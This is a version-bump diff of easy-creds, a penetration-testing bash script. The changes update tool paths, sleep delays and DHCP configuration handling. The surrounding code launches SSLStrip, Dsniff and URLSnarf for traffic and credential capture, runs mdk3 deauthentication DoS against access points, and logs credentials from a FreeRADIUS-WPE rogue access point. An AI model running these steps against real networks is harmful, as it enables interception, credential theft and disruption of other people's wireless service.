@@ -5,7 +5,7 @@
 #                                                                                                                #
 # J0hnnyBrav0 (@Brav0hax) & help from al14s (@al14s)                                                             #
 ##################################################################################################################
-# v3.7.1 Garden of Your Mind - 11/01/2012
+# v3.7.2 Garden of Your Mind - 11/20/2012
 #
 # Copyright (C) 2012  Eric Milam
 # This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public 
@@ -123,16 +123,16 @@ f_findpaths(){
 	aircrackpath="/usr/local/bin"
 	airodumppath="/usr/local/sbin"
 	asleappath="/usr/bin/"
-	ecpath="/opt/easy-creds"
+	ecpath="/pentest/sniffers/easy-creds"
 	etterpath="/usr/local/bin"
-	ferretpath="/opt/sidejack"
+	ferretpath="/usr/bin"
 	freeradiuslog="/usr/local/var/log/radius/freeradius-server-wpe.log"
 	hamsterpath="/opt/sidejack"
 	mdk3path="/usr/local/sbin"
 	pathtohostapd="/usr/sbin"
 	pathtoradiusd="/usr/local/sbin"
 	pathtoradiusconf="/usr/local/etc/raddb"
-	sslstrippath="/opt/sslstrip"
+	sslstrippath="/pentest/web/sslstrip"
 ########
 }
 
@@ -275,7 +275,7 @@ f_dhcp3install(){
 	clear
 	f_Banner
 
-	echo -e "\e[1;33m[*] Installing dhcp3-server, please stand by.\e[0m\n"
+	echo -e "\e[1;33m[*] Installing dhcp-server, please stand by.\e[0m\n"
 	if [ -e /etc/lsb-release ] || [ -e /etc/issue ]; then
 	 apt-get update &> /dev/null && apt-get install dhcp3-server -y &> /dev/null
 	elif [ -e /etc/redhat-release ]; then
@@ -329,7 +329,7 @@ f_aircrackupdate(){
 	echo -e "\e[1;33m[*] Updating airodump-ng OUI.\e[0m\n"
 	bash $airodumppath/airodump-ng-oui-update > /dev/null
 	echo -e "\n\e[1;32m[+] Finished updating Aircrack.\e[0m\n"
-	sleep 1
+	sleep 3
 
 	cd $location
 	f_prereqs
@@ -732,10 +732,20 @@ f_fakeapAttack(){
 
 ##################################################
 f_dhcpconf(){
+	
+	dhcpdconf=
+	if [ -d /etc/dhcp3 ]; then #Ubuntu/Debian dhcp3-server
+		dhcpdconf="/etc/dhcp3/dhcpd.conf"
+	elif [ -e /etc/dhcpd.conf ]; then #redhat/fedora old
+		dhcpdconf="/etc/dhcpd.conf"
+	else
+		dhcpdconf="/etc/dhcp/dhcpd.conf" #Ubuntu/Debian/RH/Fedora isc-dhcp-server
+	fi
+	
 	valid=
 	while [[ $valid != 1 ]]; do
-	 read -e -p "Path to the dhcpd.conf file [/etc/dhcp/dhpcd.conf]: " DHCPPATH
-	 if [ -z "$DHCPPATH" ]; then DHCPPATH=/etc/dhcp/dhcpd.conf; fi
+	 read -e -p "Path to the dhcpd.conf file [$dhcpdconf]: " DHCPPATH
+	 if [ -z "$DHCPPATH" ]; then DHCPPATH=$dhcpdconf; fi
 	 
 	if [ ! -f "$DHCPPATH" ]; then
 		echo -e "File not found - $DHCPPATH\n"
@@ -744,9 +754,9 @@ f_dhcpconf(){
 	 fi
 	done
 
-	cat $DHCPPATH > /tmp/ec/dhcp.conf
-	mv /tmp/ec/dhcp.conf /etc/dhcp/dhcpd.conf
-	DHCPPATH="/etc/dhcp/dhcp.conf"
+	cat $DHCPPATH > /tmp/ec/dhcpd.conf
+	mv /tmp/ec/dhcpd.conf $dhcpdconf
+	DHCPPATH=$dhcpdconf
 
 	#If your DHCP conf file is setup properly, this will work, otherwise you need to tweak it
 	ATNET=$(cat $DHCPPATH |grep -i subnet|cut -d" " -f2)
@@ -759,7 +769,17 @@ f_dhcpconf(){
 
 ##################################################
 f_ipcalc(){
-	DHCPPATH=/etc/dhcp/dhcpd.conf
+	
+	dhcpdconf=
+	if [ -d /etc/dhcp3 ]; then
+		dhcpdconf="/etc/dhcp3/dhcpd.conf"
+	elif [ -e /etc/sysconfig/dhcpd ]; then
+		dhcpdconf="/etc/dhcpd.conf"
+	else
+		dhcpdconf="/etc/dhcp/dhcp.conf"
+	fi
+	
+	DHCPPATH=$dhcpdconf
 
 	#use ipcalc to complete the DHCP setup
 	ipcalc "$ATCIDR" > /tmp/ec/atcidr
@@ -877,11 +897,11 @@ f_finalstage(){
 	  	    y=$(($y+$yoffset))
 		  fi
 		  sslstripfilename=sslstrip$(date +%F-%H%M).log
-		  xterm -geometry "$width"x$height-$x+$y -bg blue -fg white -T "SSLStrip" -e sslstrip -pfk -w $logfldr/$sslstripfilename &
+		  xterm -geometry "$width"x$height-$x+$y -bg blue -fg white -T "SSLStrip" -e python $sslstrippath/sslstrip.py -pfk -w $logfldr/$sslstripfilename &
 		else
 		  echo -e "\n\e[1;33m[*] Launching SSLStrip...\e[0m\n"
 		  sslstripfilename=sslstrip$(date +%F-%H%M).log
-		  screen -dmS easy-creds -t sslstrip sslstrip -pfk -w $logfldr/$sslstripfilename
+		  screen -dmS easy-creds -t sslstrip python $sslstrippath/sslstrip.py -pfk -w $logfldr/$sslstripfilename
 		fi
 	fi
 	echo $! > /tmp/ec/sslstrip.pid
@@ -893,17 +913,17 @@ f_finalstage(){
 		f_ecap_assimilation
 	fi
 	
-	sleep 1
+	sleep 3
 
 	echo -e "\n\e[1;33m[*] Configuring IP forwarding...\e[0m\n"
 	echo "1" > /proc/sys/net/ipv4/ip_forward
-	sleep 1
+	sleep 3
 
 	echo -e "\n\e[1;33m[*] Launching URLSnarf...\e[0m\n"
 	if [ "$wireless" == "1" ]; then
 		y=$(($y+$yoffset))
 		xterm -geometry "$width"x$height-$x+$y -T "URL Snarf" -l -lf $logfldr/urlsnarf-$(date +%F-%H%M).txt -bg black -fg green -e urlsnarf  -i $TUNIFACE &
-		sleep 1
+		sleep 3
 	elif [ "$wireless" == "1" ] && [ -z $isxrunning ]; then
 		screen -S easy-creds -t urlsnarf -X screen urlsnarf -i $TUNIFACE
 	elif [ -z $wireless ] && [ -z $isxrunning ]; then
@@ -914,14 +934,14 @@ f_finalstage(){
 	else
 		y=$(($y+$yoffset))
 		xterm -geometry "$width"x$height-$x+$y -T "URL Snarf" -l -lf $logfldr/urlsnarf-$(date +%F-%H%M).txt -bg black -fg green -e urlsnarf  -i $IFACE &
-		sleep 1
+		sleep 3
 	fi
 
 	echo -e "\n\e[1;33m[*] Launching Dsniff...\e[0m\n"
 	if [ "$wireless" == "1" ]; then
 		y=$(($y+$yoffset))
 		xterm -geometry "$width"x$height-$x+$y -T "Dsniff" -bg blue -fg white -e dsniff -m -i $TUNIFACE -w $logfldr/dsniff$(date +%F-%H%M).log &
-		sleep 1
+		sleep 3
 	elif [ "$wireless" == "1" ] && [ -z $isxrunning ]; then
 		screen -S easy-creds -t dsniff -X screen dsniff -m -i $TUNIFACE -w $logfldr/dsniff$(date +%F-%H%M).log
 	elif [ -z $wireless ] && [ -z $isxrunning ]; then
@@ -929,7 +949,7 @@ f_finalstage(){
 	else
 		y=$(($y+$yoffset))
 		xterm -geometry "$width"x$height-$x+$y -T "Dsniff" -bg blue -fg white -e dsniff -m -i $IFACE -w $logfldr/dsniff$(date +%F-%H%M).log &
-		sleep 1
+		sleep 3
 	fi
 
 	if [ "$SIDEJACK" == "y" ]; then
@@ -976,14 +996,14 @@ f_mdk3aps(){
 
 	 echo -e "\nPlacing the wireless card in monitor mode to perform DoS attack."
 	 airmon-ng start $doswlan &
-	 sleep 1
+	 sleep 3
 
 	 dosmon=$(airmon-ng | sed -n "s/.*\(mon.*$phyint\).*/\1/p;" | cut -f1)
 
 	 echo -e "\nUsing $dosmon for the attack.\n\n"
 
 	 echo -e "\n\e[1;33m[*] Please stand by while we DoS the AP with BSSID Address $dosmac...\e[0m"
-	 sleep 1
+	 sleep 3
 
 	if [ -z $isxrunning ]; then
 		screen -S easy-creds -t MDK3-DoS -X screen mdk3 $dosmon d -b /tmp/ec/ec-dosap
@@ -1020,7 +1040,7 @@ f_lastman(){
 
 	echo -e "\nPlacing the wireless card in monitor mode to perform DoS attack."
 	airmon-ng start $doswlan &
-	sleep 1
+	sleep 3
 
 	dosmon=$(airmon-ng | sed -n "s/.*\(mon.*$phyint\).*/\1/p;" | cut -f1)
 
@@ -1057,7 +1077,7 @@ f_getbssids(){
 
 	echo -e "\nPlacing the wireless card in monitor mode to perform DoS attack."
 	airmon-ng start $airowlan > /dev/null &
-	sleep 1
+	sleep 3
 
 	airomon=$(airmon-ng | sed -n "s/.*\(mon.*$phyint\).*/\1/p;" | cut -f1)
 
@@ -1070,8 +1090,8 @@ f_getbssids(){
 	fi
 	echo $! > /tmp/ec/airodump-pid
 	#wait for the process to die
-	while [ ! -z $(ps -p "$(cat /tmp/ec/airodump-pid)" | grep "$(cat /tmp/ec/airodump-pid)" | sed 's/ //g') ]; do sleep 1; done
-	sleep 1
+	while [ ! -z $(ps -p "$(cat /tmp/ec/airodump-pid)" | grep "$(cat /tmp/ec/airodump-pid)" | sed 's/ //g') ]; do sleep 3; done
+	sleep 3
 
 	#sometimes the mon interface doesn't transition properly after airodump, decided to stop the interface and restart it clean
 	airmon-ng stop $airomon &> /dev/null
@@ -1100,7 +1120,7 @@ f_getbssids(){
 
 	echo -e "\nNow Deauthing clients from $dosapname.\n\nIf there is more than one BSSID, all will be attacked...\n"
 	airmon-ng start $airowlan &> /dev/null
-	sleep 1
+	sleep 3
 
 	if [ -z $isxrunning ]; then
 		screen -S easy-creds -t MDK3-AP-DoS -X screen mdk3 $airomon d -b /tmp/ec/ec-dosap;(airmon-ng stop $airomon >/dev/null)
@@ -1275,11 +1295,16 @@ f_karmafinal(){
 	 xterm -geometry "$width"x$height-$x+$y -T "DMESG" -bg black -fg red -e tail -f /var/log/messages &
 	fi
 	echo $! > /tmp/ec/tail.pid
-	sleep 1
+	sleep 3
 
-	echo -e "\n\e[1;33m[*] DHCP server starting on tunneled interface...\e[0m\n"
-	dhcpd3 -q -cf $DHCPPATH -pf /var/run/dhcp3-server/dhcpd.pid $TUNIFACE &
-	sleep 1
+	echo -e "\n\e[1;33m[*] DHCP server starting on tunneled interface.\e[0m\n"
+	if [ -e /etc/dhcp3/dhcpd.conf ]; then
+		dhcpd3 -q -cf $DHCPPATH -pf /var/run/dhcp3-server/dhcpd.pid $TUNIFACE &
+	elif [ -e /etc/sysconfig/dhcpd ]; then
+		systemctl start dhcpd.service
+	else
+		service dhcpd start
+	fi
 
 	if [ -z $isxrunning ]; then
 	 echo -e "\n\e[1;33m[*] Launching Karmetasploit in screen. Once it loads press ctrl-a then d return to this window.\e[0m\n"
@@ -1415,19 +1440,19 @@ f_freeradiusfinal(){
 	if [ ! -z $isxrunning ]; then
 	 xterm -geometry "$width"x$height-$x+$y -T "radiusd" -bg white -fg black -e radiusd -X -f &
 	 echo $! > /tmp/ec/freeradius.pid
-	 sleep 1
+	 sleep 3
 	else
 	 screen -dmS FreeRadius -t radiusd $pathtoradiusd/radiusd -X -f
 	 echo $! > /tmp/ec/freeradius.pid
 	fi
 
 	echo -e "\n\e[1;33m[*] Launching hostapd...\e[0m\n"
-	sleep 1
+	sleep 3
 
 	if [ ! -z $isxrunning ]; then
 	 y=$(($y+$yoffset))
 	 xterm -geometry "$width"x$height-$x+$y -T "hostapd" -bg black -fg white -e $pathtohostapd/hostapd /tmp/ec/ec-hostapd.conf &
-	 sleep 1
+	 sleep 3
 	else
 	 screen -S FreeRadius -t hostapd -X screen $pathtohostapd/hostapd /tmp/ec/ec-hostapd.conf
 	 echo $! > /tmp/ec/hostapd.pid
@@ -1439,13 +1464,13 @@ f_freeradiusfinal(){
 	fi
 
 	echo -e "\n\e[1;33m[*] Launching credential log file...\e[0m\n"
-	sleep 1
+	sleep 3
 
 	if [ ! -z $isxrunning ]; then
 	 y=$(($y+$yoffset))
 	 xterm -geometry "$width"x$height-$x+$y -T "credentials" -bg black -fg green -hold -l -lf $logfldr/freeradius-creds-$(date +%F-%H%M).txt -e tail -f $freeradiuslog &
 	 echo $! > /tmp/ec/tail.pid
-	 sleep 1
+	 sleep 3
 	else
 	 screen -S FreeRadius -t credentials -X screen tail -f $freeradiuslog/freeradius-server-wpe.log
 	 screen -S easy-creds -X select 2
@@ -1609,7 +1634,7 @@ f_Banner(){
 	echo -e "||\e[1;36me\e[0m |||\e[1;36ma\e[0m |||\e[1;36ms\e[0m |||\e[1;36my\e[0m |||\e[1;36m-\e[0m |||\e[1;36mc\e[0m |||\e[1;36mr\e[0m |||\e[1;36me\e[0m |||\e[1;36md\e[0m |||\e[1;36ms\e[0m ||"
 	echo -e "||__|||__|||__|||__|||__|||__|||__|||__|||__|||__||"
 	echo -e "|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|"
-	echo -e "\e[1;33m 	Version 3.7.1 - Garden of Your Mind\e[0m"
+	echo -e "\e[1;33m 	Version 3.7.2 - Garden of Your Mind\e[0m"
 	echo
 	echo -e "\e[1;33mAt any time,\e[0m \e[1;36mctrl+c\e[0m \e[1;33m to cancel and return to the main menu\e[0m"
 	echo
